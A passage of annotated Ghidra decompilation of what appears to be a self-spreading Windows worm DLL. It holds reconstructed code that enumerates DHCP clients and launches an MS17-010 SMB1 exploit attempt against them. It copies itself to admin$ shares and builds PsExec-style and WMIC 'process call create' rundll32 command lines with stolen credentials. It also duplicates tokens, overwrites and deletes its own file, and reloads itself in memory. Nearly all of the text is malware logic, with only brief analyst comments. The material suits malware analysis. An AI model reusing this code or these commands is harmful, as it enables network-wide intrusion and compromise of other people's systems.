        if ((DVar2 == 0) && (local_14->SubnetState == DhcpSubnetEnabled)) {
          DVar2 = DhcpEnumSubnetClients
                            ((WCHAR *)0x0,local_c[0]->Elements[uVar6],local_30 + 1,0x10000,&local_10
                             ,local_28 + 1,&local_40);
          if (DVar2 == 0) {
            local_34 = local_10->NumElements;
            if ((local_34 != 0) && (uVar7 < local_34)) {
              do {
                p_Var1 = local_10->Clients[uVar7];
                if (p_Var1 != (LPDHCP_CLIENT_INFO)0x0) {
                  uVar3 = Ordinal_14(p_Var1->ClientIpAddress);
                  iVar4 = ClassifyRemoteServiceResponse_1000A3D9(uVar3);
                  if (iVar4 != 0) {
                    uVar3 = Ordinal_14(p_Var1->ClientIpAddress);
                    pCVar5 = (LPCSTR)Ordinal_12(uVar3);
                    lpMem = ConvertSmbAddressToWideString_10006916(pCVar5);
                    if (lpMem != (LPWSTR)0x0) {
                      QueueNetworkHostFromArgument_10006FC7(param_1);
                      DVar2 = 0;
                      hHeap = GetProcessHeap();
                      HeapFree(hHeap,DVar2,lpMem);
                    }
                  }
                }
                uVar7 = local_18 + 1;
                local_18 = uVar7;
              } while (uVar7 < local_34);
            }
            DhcpRpcFreeMemory(local_10);
          }
        }
        uVar6 = local_1c + 1;
        local_1c = uVar6;
      } while (uVar6 < local_3c);
    }
    DhcpRpcFreeMemory(local_c[0]);
  }
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: ApplyRelocationsToCopiedImage_100091FA
 * Ghidra symbol: FUN_100091fa | VA: 0x100091FA | original source line: 8458
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> relocation_table, param_2 -> image_base
 */
int __thiscall ApplyRelocationsToCopiedImage_100091FA(void *this,int relocation_table)

{
  int *piVar1;
  ushort uVar2;
  int iVar3;
  ushort *puVar4;
  int local_c;
  uint local_8;
  
  iVar3 = *(int *)this;
  local_c = 1;
  while ((iVar3 != 0 && (local_c != 0))) {
    local_8 = 0;
    puVar4 = (ushort *)((int)this + 8);
    if ((*(int *)((int)this + 4) - 8U & 0xfffffffe) != 0) {
      do {
        uVar2 = *puVar4;
        if (uVar2 != 0) {
          if ((uVar2 & 0xf000) == 0x3000) {
            piVar1 = (int *)((uVar2 & 0xfff) + iVar3 + relocation_table);
            *piVar1 = *piVar1 + (relocation_table - DAT_1001f120);
          }
          else {
            local_c = 0;
          }
        }
        local_8 = local_8 + 1;
        puVar4 = puVar4 + 1;
      } while (local_8 < *(int *)((int)this + 4) - 8U >> 1);
    }
    this = (void *)((int)this + *(int *)((int)this + 4));
    iVar3 = *(int *)this;
  }
  return local_c;
}



/*
 * RECONSTRUCTED FUNCTION: FinalizeCopiedImageProtection_10009286
 * Ghidra symbol: FUN_10009286 | VA: 0x10009286 | original source line: 8497
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: VirtualProtect
 * Direct function references: none mapped
 */
int FinalizeCopiedImageProtection_10009286(LPVOID param_1)

{
  uint uVar1;
  BOOL BVar2;
  DWORD flNewProtect;
  int unaff_ESI;
  uint *puVar3;
  DWORD local_10;
  int local_c;
  int local_8;
  
  local_8 = 0;
  BVar2 = VirtualProtect(param_1,*(SIZE_T *)(unaff_ESI + 0x54),2,&local_10);
  if (BVar2 != 0) {
    local_c = 0;
    local_8 = 1;
    if (*(short *)(unaff_ESI + 6) != 0) {
      puVar3 = (uint *)((uint)*(ushort *)(unaff_ESI + 0x14) + unaff_ESI + 0x3c);
      do {
        if (local_8 == 0) {
          return 0;
        }
        uVar1 = *puVar3;
        flNewProtect = 2;
        if ((uVar1 & 0x20000000) == 0) {
          if ((int)uVar1 < 0) {
            flNewProtect = 4;
          }
        }
        else {
          flNewProtect = (-(uint)((uVar1 & 0x80000000) != 0) & 0x20) + 0x20;
        }
        BVar2 = VirtualProtect((LPVOID)(puVar3[-6] + (int)param_1),puVar3[-7],flNewProtect,&local_10
                              );
        if (BVar2 == 0) {
          local_8 = 0;
        }
        puVar3 = puVar3 + 10;
        local_c = local_c + 1;
      } while (local_c < (int)(uint)*(ushort *)(unaff_ESI + 6));
    }
  }
  return local_8;
}



/*
 * RECONSTRUCTED FUNCTION: TranslateImageRva_10009322
 * Ghidra symbol: FUN_10009322 | VA: 0x10009322 | original source line: 8545
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> pe_header, param_2 -> relative_virtual_address
 */
int __thiscall TranslateImageRva_10009322(void *this,uint pe_header)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = *(ushort *)((int)this + 0x14) + 0x18 + (int)this;
  iVar3 = 0;
  if (*(ushort *)((int)this + 6) != 0) {
    do {
      uVar1 = *(uint *)(iVar2 + 0xc);
      if ((uVar1 <= pe_header) && (pe_header <= *(int *)(iVar2 + 0x10) + uVar1)) {
        return (*(int *)(iVar2 + 0x14) - uVar1) + pe_header;
      }
      iVar2 = iVar2 + 0x28;
      iVar3 = iVar3 + 1;
    } while (iVar3 < (int)(uint)*(ushort *)((int)this + 6));
  }
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: ResolveRuntimeApiDynamically_10009367
 * Ghidra symbol: FUN_10009367 | VA: 0x10009367 | original source line: 8569
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: VirtualProtect, GetProcAddress
 * Direct function references: none mapped
 */
BOOL ResolveRuntimeApiDynamically_10009367(void)

{
  LPCSTR pCVar1;
  int iVar2;
  BOOL BVar3;
  FARPROC pFVar4;
  LPCSTR lpProcName;
  int *piVar5;
  undefined4 *puVar6;
  uint *puVar7;
  uint local_14;
  int local_10;
  HMODULE local_c;
  BOOL local_8;
  
  local_8 = 0;
  iVar2 = *(int *)(DAT_1001f120 + 0x3c) + DAT_1001f120;
  piVar5 = (int *)(*(int *)(iVar2 + 0x80) + DAT_1001f120);
  if (piVar5 != (int *)0x0) {
    local_c = (HMODULE)0x0;
    local_10 = *(ushort *)(iVar2 + 0x14) + 0x18 + iVar2;
    if (*(ushort *)(iVar2 + 6) != 0) {
      local_14 = *(uint *)(iVar2 + 0xd8);
      do {
        if ((*(uint *)(local_10 + 0xc) <= local_14) &&
           (local_14 < *(int *)(local_10 + 8) + *(uint *)(local_10 + 0xc))) break;
        local_c = (HMODULE)((int)&local_c->unused + 1);
        local_10 = local_10 + 0x28;
      } while ((int)local_c < (int)(uint)*(ushort *)(iVar2 + 6));
    }
    iVar2 = local_10;
    BVar3 = VirtualProtect((LPVOID)(*(int *)(local_10 + 0xc) + DAT_1001f120),
                           *(SIZE_T *)(local_10 + 8),4,&local_14);
    if (BVar3 != 0) {
      local_8 = 1;
      if (*piVar5 != 0) {
        do {
          if (local_8 != 1) break;
          local_c = LoadLibraryA((LPCSTR)(piVar5[3] + DAT_1001f120));
          if (local_c == (HMODULE)0x0) {
            local_8 = 0;
          }
          else {
            puVar6 = (undefined4 *)(piVar5[4] + DAT_1001f120);
            puVar7 = (uint *)(*piVar5 + DAT_1001f120);
            while ((pCVar1 = (LPCSTR)*puVar7, pCVar1 != (LPCSTR)0x0 && (local_8 == 1))) {
              lpProcName = (LPCSTR)((uint)pCVar1 & 0x7fffffff);
              if (lpProcName == pCVar1) {
                lpProcName = lpProcName + DAT_1001f120 + 2;
              }
              pFVar4 = GetProcAddress(local_c,lpProcName);
              *puVar6 = pFVar4;
              if (pFVar4 == (FARPROC)0x0) {
                local_8 = 0;
              }
              puVar6 = puVar6 + 1;
              puVar7 = puVar7 + 1;
            }
            iVar2 = local_10;
          }
          piVar5 = piVar5 + 5;
        } while (*piVar5 != 0);
        if (local_8 == 0) {
          return 0;
        }
      }
      local_8 = VirtualProtect((LPVOID)(*(int *)(iVar2 + 0xc) + DAT_1001f120),*(SIZE_T *)(iVar2 + 8)
                               ,local_14,&local_14);
    }
  }
  return local_8;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

/*
 * RECONSTRUCTED FUNCTION: CopiedImageCallback_100094A5
 * Ghidra symbol: FUN_100094a5 | VA: 0x100094A5 | original source line: 8647
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: CreateFileW, GetFileSize, GetProcessHeap, WriteFile
 * Direct function references: ExportOrdinal1MainDispatcher_10007DEB, ResolveRuntimeApiDynamically_10009367
 */
void CopiedImageCallback_100094A5(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4)

{
  HANDLE pvVar1;
  HANDLE pvVar2;
  LPVOID lpBuffer;
  BOOL BVar3;
  DWORD dwFlags;
  DWORD DVar4;
  DWORD local_8;
  
  DAT_1001f114 = FreeLibrary(DAT_1001f120);
  if (DAT_1001f114 == 0) {
    return;
  }
  DAT_1001f120 = DAT_1001f13c;
  pvVar1 = CreateFileW(&g_original_dll_path,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (pvVar1 != (HANDLE)0x0) {
    local_8 = GetFileSize(pvVar1,(LPDWORD)0x0);
    CloseHandle(pvVar1);
    pvVar1 = CreateFileW(&g_original_dll_path,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
    if (pvVar1 != (HANDLE)0x0) {
      dwFlags = 8;
      DVar4 = local_8;
      pvVar2 = GetProcessHeap();
      lpBuffer = HeapAlloc(pvVar2,dwFlags,DVar4);
      if (lpBuffer != (LPVOID)0x0) {
        WriteFile(pvVar1,lpBuffer,local_8,&local_8,(LPOVERLAPPED)0x0);
        DVar4 = 0;
        pvVar2 = GetProcessHeap();
        HeapFree(pvVar2,DVar4,lpBuffer);
      }
      CloseHandle(pvVar1);
    }
  }
  _DAT_1001f10c = DeleteFileW(&g_original_dll_path);
  BVar3 = ResolveRuntimeApiDynamically_10009367();
  if (BVar3 != 0) {
    ExportOrdinal1MainDispatcher_10007DEB(param_1,param_2,param_3,param_4);
  }
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



/*
 * RECONSTRUCTED FUNCTION: MapAndReenterMemoryImage_10009590
 * Ghidra symbol: FUN_10009590 | VA: 0x10009590 | original source line: 8693
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: VirtualProtect
 * Direct function references: ApplyRelocationsToCopiedImage_100091FA, FinalizeCopiedImageProtection_10009286, TranslateImageRva_10009322, CopiedImageCallback_100094A5
 */
undefined4 MapAndReenterMemoryImage_10009590(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  SIZE_T SVar1;
  undefined1 *puVar2;
  SIZE_T dwSize;
  undefined1 *_Dst;
  int iVar3;
  int iVar4;
  BOOL BVar5;
  void *pvVar6;
  DWORD local_c;
  SIZE_T local_8;
  
  pvVar6 = DAT_1001f120;
  if ((DAT_1001f114 == 0) && (DAT_1001f0fc != 0)) {
    SVar1 = *(SIZE_T *)(*(int *)((int)DAT_1001f120 + 0x3c) + 0x50 + (int)DAT_1001f120);
    local_8 = SVar1;
    _Dst = VirtualAlloc((LPVOID)0x0,SVar1,0x1000,4);
    if (_Dst != (undefined1 *)0x0) {
      DAT_1001f13c = _Dst;
      memcpy(_Dst,pvVar6,SVar1);
      iVar4 = DAT_1001f0fc;
      pvVar6 = (void *)(*(int *)(DAT_1001f0fc + 0x3c) + DAT_1001f0fc);
      if (((pvVar6 != (void *)0x0) && (*(uint *)((int)pvVar6 + 0xa0) != 0)) &&
         (*(int *)((int)pvVar6 + 0xa4) != 0)) {
        iVar3 = TranslateImageRva_10009322(pvVar6,*(uint *)((int)pvVar6 + 0xa0));
        if ((((void *)(iVar3 + iVar4) != (void *)0x0) &&
            (iVar4 = ApplyRelocationsToCopiedImage_100091FA((void *)(iVar3 + iVar4),(int)_Dst), iVar4 != 0)) &&
           (iVar4 = FinalizeCopiedImageProtection_10009286(_Dst), iVar4 != 0)) {
          (*(code *)(_Dst + ((int)CopiedImageCallback_100094A5 - (int)DAT_1001f120)))
                    (param_1,param_2,param_3,0xffffffff);
        }
      }
      dwSize = local_8;
      BVar5 = VirtualProtect(_Dst,local_8,4,&local_c);
      puVar2 = _Dst;
      SVar1 = dwSize;
      if (BVar5 != 0) {
        for (; SVar1 != 0; SVar1 = SVar1 - 1) {
          *puVar2 = 0;
          puVar2 = puVar2 + 1;
        }
        VirtualFree(_Dst,dwSize,0x4000);
      }
    }
  }
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: NormalizeIpv4AddressText_10009683
 * Ghidra symbol: FUN_10009683 | VA: 0x10009683 | original source line: 8745
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: Ordinal_52
 * Direct function references: none mapped
 */
bool NormalizeIpv4AddressText_10009683(LPSTR param_1)

{
  byte *pbVar1;
  int iVar2;
  
  iVar2 = Ordinal_52(param_1);
  if (iVar2 != 0) {
    pbVar1 = (byte *)**(undefined4 **)(iVar2 + 0xc);
    wsprintfA(param_1,"%u.%u.%u.%u",(uint)*pbVar1,(uint)pbVar1[1],(uint)pbVar1[2],(uint)pbVar1[3]);
  }
  return iVar2 != 0;
}



/*
 * RECONSTRUCTED FUNCTION: TryMs17010ExploitAgainstRemoteHost_100096C7
 * Ghidra symbol: FUN_100096c7 | VA: 0x100096C7 | original source line: 8761
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: Ordinal_11
 * Direct function references: Smb1RunTwoPhaseExploitAttempt_1000668A, NormalizeIpv4AddressText_10009683
 * Parameter names recovered semantically: param_1 -> remote_host_name
 * ANALYST OBSERVATION: Takes a remote host string, normalizes a network address, and calls 0x1000668A.
 * ANALYST OBSERVATION: This links host enumeration/worker orchestration to the SMB1 exploit-attempt component.
 */
undefined4 TryMs17010ExploitAgainstRemoteHost_100096C7(LPCWSTR remote_host_name,undefined4 param_2,undefined4 param_3)

{
  WCHAR WVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  bool bVar4;
  LPWSTR pWVar5;
  int iVar6;
  undefined3 extraout_var;
  WCHAR *pWVar7;
  WCHAR local_314;
  undefined1 local_312 [518];
  CHAR local_10c [260];
  undefined4 local_8;
  
  uVar3 = DAT_1001f11c;
  uVar2 = DAT_1001f0fc;
  local_8 = 0;
  if (((g_runtime_feature_flags & 4) != 0) &&
     (pWVar5 = PathFindFileNameW(&g_original_dll_path), pWVar5 != (LPWSTR)0x0)) {
    iVar6 = -2 - (int)pWVar5;
    do {
      WVar1 = *pWVar5;
      *(WCHAR *)(local_312 + iVar6 + (int)pWVar5) = WVar1;
      pWVar5 = pWVar5 + 1;
    } while (WVar1 != L'\0');
    WideCharToMultiByte(0xfde9,0,remote_host_name,-1,local_10c,0x104,(LPCSTR)0x0,(LPBOOL)0x0);
    iVar6 = Ordinal_11(local_10c);
    if ((iVar6 == -1) && (bVar4 = NormalizeIpv4AddressText_10009683(local_10c), CONCAT31(extraout_var,bVar4) == 0)) {
      return local_8;
    }
    pWVar7 = &local_314;
    do {
      WVar1 = *pWVar7;
      pWVar7 = pWVar7 + 1;
    } while (WVar1 != L'\0');
    iVar6 = Smb1RunTwoPhaseExploitAttempt_1000668A(local_10c,uVar2,uVar3,param_2,param_3,&local_314,
                         (int)pWVar7 - (int)local_312 >> 1);
    if (iVar6 == 0) {
      local_8 = 1;
    }
  }
  return local_8;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

/*
 * RECONSTRUCTED FUNCTION: RemoteServiceAssessment_100097A5
 * Ghidra symbol: FUN_100097a5 | VA: 0x100097A5 | original source line: 8811
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: ComposeNetworkWorkItemParameters_10006BB0, NormalizeRemoteTarget_10008B70
 */
undefined4 __thiscall RemoteServiceAssessment_100097A5(void *this,undefined4 param_1)

{
  short sVar1;
  short *psVar2;
  BOOL BVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  LPWSTR unaff_EBX;
  uint uVar7;
  WCHAR local_4214 [8192];
  undefined1 local_214 [520];
  undefined4 local_c;
  DWORD local_8;
  
  local_8 = 0x100097b2;
  *unaff_EBX = L'\0';
  *(undefined2 *)this = 0;
  uVar7 = 0;
  local_c = 0;
  NormalizeRemoteTarget_10008B70((int)local_214);
  local_8 = 0;
  if (g_remote_execution_tool_path == (short *)0x0) {
    local_8 = 3;
  }
  else {
    psVar2 = g_remote_execution_tool_path;
    do {
      sVar1 = *psVar2;
      psVar2 = psVar2 + 1;
    } while (sVar1 != 0);
    uVar7 = (int)psVar2 - (int)(g_remote_execution_tool_path + 1) >> 1;
    if (uVar7 < 0x105) {
      iVar6 = (int)this - (int)g_remote_execution_tool_path;
      psVar2 = g_remote_execution_tool_path;
      do {
        sVar1 = *psVar2;
        *(short *)(iVar6 + (int)psVar2) = sVar1;
        psVar2 = psVar2 + 1;
      } while (sVar1 != 0);
    }
    else {
      local_8 = 0x7a;
    }
  }
  SetLastError(local_8);
  if ((uVar7 == 0) || (BVar3 = PathFileExistsW(this), BVar3 == 0)) {
    *unaff_EBX = L'\0';
    *(undefined2 *)this = 0;
  }
  else {
    iVar6 = wsprintfW(unaff_EBX,L"%s \\\\%s -accepteula -s ",this,param_1);
    iVar4 = wsprintfW(unaff_EBX + iVar6,
                      L"-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 ",local_214);
    uVar5 = ComposeNetworkWorkItemParameters_10006BB0(local_4214);
    uVar7 = 0x1fff;
    if (uVar5 + 1 < 0x2000) {
      uVar7 = uVar5 + 1;
    }
    memcpy(unaff_EBX + iVar6 + iVar4,local_4214,uVar7 * 2);
    local_c = 1;
  }
  return local_c;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

undefined4 __thiscall
/*
 * RECONSTRUCTED FUNCTION: AlternateRemoteServiceAssessment_100098AB
 * Ghidra symbol: FUN_100098ab | VA: 0x100098AB | original source line: 8882
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetSystemDirectoryW, GetLastError
 * Direct function references: ComposeNetworkWorkItemParameters_10006BB0, NormalizeRemoteTarget_10008B70
 */
AlternateRemoteServiceAssessment_100098AB(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  WCHAR WVar1;
  UINT UVar2;
  BOOL BVar3;
  int iVar4;
  int iVar5;
  WCHAR *pWVar6;
  LPWSTR unaff_ESI;
  WCHAR local_420c [8192];
  undefined1 local_20c [516];
  undefined4 uStack_8;
  
  uStack_8 = 0x100098b8;
  *unaff_ESI = L'\0';
  *(undefined2 *)this = 0;
  NormalizeRemoteTarget_10008B70((int)local_20c);
  UVar2 = GetSystemDirectoryW(this,0x104);
  if (UVar2 == 0) {
    GetLastError();
  }
  else {
    PathAppendW(this,L"wbem\\wmic.exe");
    BVar3 = PathFileExistsW(this);
    if (BVar3 != 0) {
      iVar4 = wsprintfW(unaff_ESI,L"%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\" ",this,param_1,
                        param_2,param_3);
      iVar5 = wsprintfW(unaff_ESI + iVar4,
                        L"process call create \"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\\%s\\\" #1 "
                        ,local_20c);
      iVar4 = iVar4 + iVar5;
      ComposeNetworkWorkItemParameters_10006BB0(local_420c);
      pWVar6 = local_420c;
      while( true ) {
        WVar1 = *pWVar6;
        if (WVar1 == L'\"') {
          unaff_ESI[iVar4] = L'\\';
          iVar4 = iVar4 + 1;
        }
        unaff_ESI[iVar4] = WVar1;
        if (WVar1 == L'\0') break;
        pWVar6 = pWVar6 + 1;
        iVar4 = iVar4 + 1;
      }
      wsprintfW(unaff_ESI + iVar4,L"\"");
      return 1;
    }
  }
  *unaff_ESI = L'\0';
  *(undefined2 *)this = 0;
  return 0;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

/*
 * RECONSTRUCTED FUNCTION: RemoteExecutionCoordinator_10009987
 * Ghidra symbol: FUN_10009987 | VA: 0x10009987 | original source line: 8940
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: WNetAddConnection2W, GetLastError, GetCurrentThread, WNetCancelConnection2W, CreateProcessW, CreateProcessAsUserW, GetExitCodeProcess
 * Direct function references: QueueDiscoveredNetworkTarget_10006CE7, WriteResourceToFile_10008946, NormalizeRemoteTarget_10008B70, RemoteServiceAssessment_100097A5, AlternateRemoteServiceAssessment_100098AB
 * ANALYST OBSERVATION: Remote execution coordinator, separate from SMB1 exploit attempt; includes process creation.
 */
uint RemoteExecutionCoordinator_10009987(int param_1,LPCWSTR param_2,LPCWSTR param_3,DWORD *param_4)

{
  bool bVar1;
  LPWSTR pWVar2;
  BOOL BVar3;
  HANDLE ThreadHandle;
  int iVar4;
  DWORD *pDVar5;
  DWORD DesiredAccess;
  HANDLE *TokenHandle;
  int iStack_11ac4;
  uint uStack_11ac0;
  DWORD DStack_11abc;
  HANDLE pvStack_11ab8;
  HANDLE pvStack_11ab4;
  DWORD DStack_11ab0;
  DWORD DStack_11aac;
  _PROCESS_INFORMATION _Stack_11aa8;
  _STARTUPINFOW _Stack_11a98;
  _NETRESOURCEW _Stack_11a50;
  WCHAR aWStack_11a30 [260];
  undefined1 auStack_11828 [520];
  WCHAR aWStack_11620 [780];
  WCHAR aWStack_11008 [1024];
  WCHAR aWStack_10808 [1024];
  WCHAR aWStack_10008 [32766];
  undefined4 uStack_c;
  
  uStack_c = 0x10009997;
  bVar1 = false;
  uStack_11ac0 = 0;
  DStack_11abc = 0;
  DStack_11aac = 0;
  if (param_1 == 0) {
    DStack_11abc = 0x57;
  }
  else {
    aWStack_11a30[0] = L'\0';
    wsprintfW(aWStack_11a30,L"\\\\%s\\admin$",param_1);
    _Stack_11a50.dwScope = 0;
    pDVar5 = &_Stack_11a50.dwType;
    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {
      *pDVar5 = 0;
      pDVar5 = pDVar5 + 1;
    }
    _Stack_11a50.lpRemoteName = aWStack_11a30;
    _Stack_11a50.dwType = 1;
    NormalizeRemoteTarget_10008B70((int)auStack_11828);
    wsprintfW(aWStack_10808,L"\\\\%ws\\admin$\\%ws",param_1,auStack_11828);
    while( true ) {
      aWStack_11008[0] = L'\0';
      DStack_11aac = WNetAddConnection2W(&_Stack_11a50,param_3,param_2,0);
      wsprintfW(aWStack_11008,L"\\\\%ws\\admin$\\%ws",param_1,auStack_11828);
      pWVar2 = PathFindExtensionW(aWStack_11008);
      if (pWVar2 != (LPWSTR)0x0) {
        *pWVar2 = L'\0';
        BVar3 = PathFileExistsW(aWStack_11008);
        if (BVar3 != 0) {
          uStack_11ac0 = 1;
          goto LAB_10009d7c;
        }
        DStack_11abc = GetLastError();
      }
      iVar4 = WriteResourceToFile_10008946(aWStack_10808,DAT_1001f0fc,1);
      if (iVar4 != 0) {
        if ((param_2 != (LPCWSTR)0x0) && (param_3 != (LPCWSTR)0x0)) {
          QueueDiscoveredNetworkTarget_10006CE7(param_2,param_3);
          DAT_10016010 = 1;
        }
        TokenHandle = &pvStack_11ab4;
        BVar3 = 1;
        DesiredAccess = 2;
        pvStack_11ab4 = (HANDLE)0x0;
        pvStack_11ab8 = (HANDLE)0x0;
        ThreadHandle = GetCurrentThread();
        BVar3 = OpenThreadToken(ThreadHandle,DesiredAccess,BVar3,TokenHandle);
        if (BVar3 != 0) {
          DuplicateTokenEx(pvStack_11ab4,0x2000000,(LPSECURITY_ATTRIBUTES)0x0,SecurityImpersonation,
                           TokenPrimary,&pvStack_11ab8);
        }
        iStack_11ac4 = 0;
        goto LAB_10009b82;
      }
      DStack_11abc = GetLastError();
      if ((((DStack_11abc == 0x50) || (DStack_11abc == 0x35)) || (DStack_11abc == 0x43)) ||
         (DStack_11aac != 0x4c3)) goto LAB_10009d7c;
      if (bVar1) break;
      bVar1 = true;
      WNetCancelConnection2W(aWStack_11a30,0,1);
    }
  }
  goto LAB_10009d9f;
LAB_10009b82:
  if (uStack_11ac0 != 0) goto LAB_10009d58;
  aWStack_10008[0] = L'\0';
  aWStack_11620[0] = L'\0';
  _Stack_11aa8.hProcess = (HANDLE)0x0;
  _Stack_11aa8.hThread = (HANDLE)0x0;
  _Stack_11aa8.dwProcessId = 0;
  _Stack_11aa8.dwThreadId = 0;
  memset(&_Stack_11a98.lpReserved,0,0x40);
  _Stack_11a98.cb = 0x44;
  _Stack_11a98.dwFlags = 1;
  _Stack_11a98.wShowWindow = 0;
  if (iStack_11ac4 == 0) {
    RemoteServiceAssessment_100097A5(aWStack_11620,param_1);
  }
  if (iStack_11ac4 == 1) {
    if ((param_2 == (LPCWSTR)0x0) || (param_3 == (LPCWSTR)0x0)) goto LAB_10009d4a;
    AlternateRemoteServiceAssessment_100098AB(aWStack_11620,param_1,param_2,param_3);
  }
  if ((aWStack_10008[0] == L'\0') || (aWStack_11620[0] == L'\0')) {
LAB_10009d2b:
    DStack_11abc = GetLastError();
  }
  else {
    if (pvStack_11ab8 == (HANDLE)0x0) {
      iVar4 = CreateProcessW(aWStack_11620,aWStack_10008,(LPSECURITY_ATTRIBUTES)0x0,
                             (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,
                             &_Stack_11a98,&_Stack_11aa8);
    }
    else {
      iVar4 = CreateProcessAsUserW
                        (pvStack_11ab8,aWStack_11620,aWStack_10008,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,
                         &_Stack_11a98,&_Stack_11aa8);
    }
    if (iVar4 == 0) goto LAB_10009d2b;
    WaitForSingleObject(_Stack_11aa8.hProcess,0xffffffff);
    DStack_11ab0 = 0;
    GetExitCodeProcess(_Stack_11aa8.hProcess,&DStack_11ab0);
    if (_Stack_11a98.hStdError != (HANDLE)0x0) {
      CloseHandle(_Stack_11a98.hStdError);
    }
    if (_Stack_11a98.hStdInput != (HANDLE)0x0) {
      CloseHandle(_Stack_11a98.hStdInput);
    }
    if (_Stack_11a98.hStdOutput != (HANDLE)0x0) {
      CloseHandle(_Stack_11a98.hStdOutput);
    }
    if (_Stack_11aa8.hThread != (HANDLE)0x0) {
      CloseHandle(_Stack_11aa8.hThread);
    }
    if (_Stack_11aa8.hProcess != (HANDLE)0x0) {
      CloseHandle(_Stack_11aa8.hProcess);
    }
    if (iStack_11ac4 == 0) {
      if ((DStack_11ab0 == 0) || ((DStack_11ab0 & 3) != 0)) {
LAB_10009d17:
        uStack_11ac0 = PathFileExistsW(aWStack_11008);
      }
      else {
        uStack_11ac0 = 1;
      }
    }
    else if ((iStack_11ac4 != 1) || (uStack_11ac0 = (uint)(DStack_11ab0 == 0), uStack_11ac0 == 0))
    goto LAB_10009d17;
  }
  iStack_11ac4 = iStack_11ac4 + 1;
  if (1 < iStack_11ac4) goto code_r0x10009d44;
  goto LAB_10009b82;
code_r0x10009d44:
  if (uStack_11ac0 == 0) {
LAB_10009d4a:
    DeleteFileW(aWStack_10808);
  }
LAB_10009d58:
  if (pvStack_11ab8 != (HANDLE)0x0) {
    CloseHandle(pvStack_11ab8);
    pvStack_11ab8 = (HANDLE)0x0;
  }
  if (pvStack_11ab4 != (HANDLE)0x0) {
    CloseHandle(pvStack_11ab4);
  }
LAB_10009d7c:
  if (DStack_11aac == 0) {
    WNetCancelConnection2W(aWStack_11a30,0,1);
  }
LAB_10009d9f:
  if (param_4 != (DWORD *)0x0) {
    *param_4 = DStack_11aac;
  }
  SetLastError(DStack_11abc);
  return uStack_11ac0;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

/*
 * RECONSTRUCTED FUNCTION: PrepareRemoteWorkItem_10009DC3
 * Ghidra symbol: FUN_10009dc3 | VA: 0x10009DC3 | original source line: 9131
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: ComposeNetworkWorkItemParameters_10006BB0, TryMs17010ExploitAgainstRemoteHost_100096C7
 */
undefined4 PrepareRemoteWorkItem_10009DC3(LPCWSTR param_1)

{
  uint uVar1;
  undefined4 uVar2;
  WCHAR local_4004 [8190];
  undefined4 uStack_8;
  
  uStack_8 = 0x10009dd0;
  local_4004[0] = L'\0';
  uVar2 = 0;
  uVar1 = ComposeNetworkWorkItemParameters_10006BB0(local_4004);
  if (uVar1 != 0) {
    uVar2 = TryMs17010ExploitAgainstRemoteHost_100096C7(param_1,local_4004,uVar1);
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: ExecuteWorkItem_10009E05
 * Ghidra symbol: FUN_10009e05 | VA: 0x10009E05 | original source line: 9151
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: AllocateNetworkWorkItem_1000711F, SelectNextNetworkWorkItem_10007167, RemoteExecutionCoordinator_10009987
 */
uint ExecuteWorkItem_10009E05(int param_1)

{
  undefined4 *puVar1;
  undefined4 *lpMem;
  int iVar2;
  HANDLE hHeap;
  DWORD dwFlags;
  uint local_10;
  int *local_c [2];
  
  local_10 = 0;
  local_c[0] = (int *)0x0;
  lpMem = AllocateNetworkWorkItem_1000711F(3,(int *)local_c);
  if (lpMem != (undefined4 *)0x0) {
    do {
      puVar1 = (undefined4 *)*local_c[0];
      local_c[0] = (int *)0x0;
      local_10 = RemoteExecutionCoordinator_10009987(param_1,(LPCWSTR)*puVar1,(LPCWSTR)puVar1[1],(DWORD *)local_c);
      if ((((local_c[0] == (int *)0x4b3) || (local_c[0] == (int *)0x4c6)) ||
          (local_c[0] == (int *)0x35)) ||
         (((local_c[0] == (int *)0x40 || (local_c[0] == (int *)0x43)) || (local_10 != 0)))) break;
      local_c[0] = (int *)0x0;
      iVar2 = SelectNextNetworkWorkItem_10007167((int *)local_c);
    } while (iVar2 != 0);
    dwFlags = 0;
